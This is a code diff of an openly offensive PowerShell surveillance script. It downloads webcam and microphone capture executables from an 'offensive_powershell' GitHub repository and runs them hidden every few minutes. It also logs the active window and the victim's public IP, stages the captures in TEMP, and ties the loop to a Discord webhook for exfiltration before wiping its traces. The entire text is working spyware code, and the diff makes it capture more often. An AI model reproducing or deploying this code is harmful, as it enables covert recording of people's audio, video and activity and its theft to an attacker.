@@ -1,8 +1,12 @@
+param(
+    [bool]$instant=$false
+)
+
 $Webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
 $BaseDir = "$env:TEMP\$env:COMPUTERNAME`_$env:USERNAME`_data"
 $Counter = 0
 
-if(!(Test-Path -Path $BaseDir -PathType Container)) { 
+if(-not(Test-Path -Path $BaseDir -PathType Container)) { 
     New-Item -Path $BaseDir -ItemType Directory -Force | Out-Null 
 }
 
@@ -40,13 +44,18 @@ function Get-Tool {
     return $path
 }
 
+try {
+    $ip = (Invoke-RestMethod -Uri "https://ifconfig.me/ip" -TimeoutSec 3 -ErrorAction SilentlyContinue)
+} catch { }
+
 while ($true) {
     $time = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
     $activeWindow = (Get-Process | Where-Object {$_.MainWindowTitle} | Sort-Object CPU -Descending | Select-Object -First 1).MainWindowTitle
     $foregroundProc = (Get-Process | Where-Object {$_.Id -eq (Get-Process -Id (Get-NetTCPConnection -State Established | Where-Object {$_.OwningProcess} | Select-Object -First 1).OwningProcess)}).Name
-    try {
-        $ip = (Invoke-RestMethod -Uri "https://ifconfig.me/ip" -TimeoutSec 3 -ErrorAction SilentlyContinue)
-    } catch {}
+    
+    if(-not(Test-Path -Path $BaseDir -PathType Container)) { 
+        New-Item -Path $BaseDir -ItemType Directory -Force | Out-Null 
+    }
 
     Add-Type -AssemblyName System.Windows.Forms,System.Drawing 
 
@@ -77,7 +86,7 @@ while ($true) {
         $dropPaths = Get-Paths
     }
 
-    if( $Counter % 20 -eq 0 ) { # either mod with 12(3 min interval) or 20 (5 minute interval)
+    if( $Counter % 12 -eq 0 -or $instant ) { # either mod with 12(3 min interval) or 20 (5 minute interval)
         if( -not( Test-Path -Path "$mic_path" -PathType Leaf ) ){
             $mic_path = $dropPaths | Get-Random
             $randomFileName = [System.IO.Path]::GetRandomFileName()
@@ -90,26 +99,28 @@ while ($true) {
             $cam_path = Get-Tool -url "https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/cam_cap.exe" -name $randomFileName -path $cam_path
             Write-Output "cam path: $cam_path"
         }
-        $params = @("-o", "$BaseDir\mic.wav", "-d", "10")
-        $params2 = @("-o", "$BaseDir\cam.jpg")
+        $micParam = @("-o", "$BaseDir\mic_$env:USERNAME.wav", "-d", "10")
+        $camParam = @("-o", "$BaseDir\cam_$env:USERNAME.jpg")
         
-        # Start-Process $mic_path -WindowStyle Hidden -ArgumentList "-o `"$BaseDir\mic.wav`" -d 10"
-        # Start-Process $cam_path -WindowStyle Hidden -ArgumentList "-o `"$BaseDir\cam.jpg`""
-        
-        $micProc = Start-Process $mic_path -WindowStyle Hidden -ArgumentList $params -PassThru
-        $camProc = Start-Process $cam_path -WindowStyle Hidden -ArgumentList $params2 -PassThru
-        
+        Get-Process | Where-Object {$_.Path -eq $mic_path -or $_.Path -eq $cam_path} | ForEach-Object {
+            try { $_.Kill(); } catch {}
+        }
+
+        # write-output "Before Start-Process $(Get-Date)"
+        $micProc = Start-Process $mic_path -WindowStyle Hidden -ArgumentList $micParam -PassThru
+        $camProc = Start-Process $cam_path -WindowStyle Hidden -ArgumentList $camParam -PassThru
+        # write-output "After Start-Process $(Get-Date)"
     }
 
     if( $Counter -gt 0 -and $Counter % 240 -eq 0 ) {
-        if(-not($micProc.HasExited)) {
+        if($null -ne $micProc -and -not($micProc.HasExited)) {
             $micDone = $micProc.WaitForExit(10000)
             if(-not($micDone)){
                 $micProc.Kill()
             }
         }
-        if(-not($camProc.HasExited)) { 
-            $camDone = $camProc.WaitForExit(10000)
+        if($null -ne $camProc -and -not($camProc.HasExited)) { 
+            $camDone = $camProc.WaitForExit(1000)
             if(-not($camDone)){
                 $camProc.Kill()
             }
@@ -121,7 +132,9 @@ while ($true) {
         Remove-Item "$BaseDir\*" -Force -Recurse
         Remove-Item $zip -Force
         $Counter = 0
+        $micProc = $null
+        $camProc = $null
     }
-    Start-Sleep -Seconds 15
     $Counter++
+    Start-Sleep -Seconds 15
 }
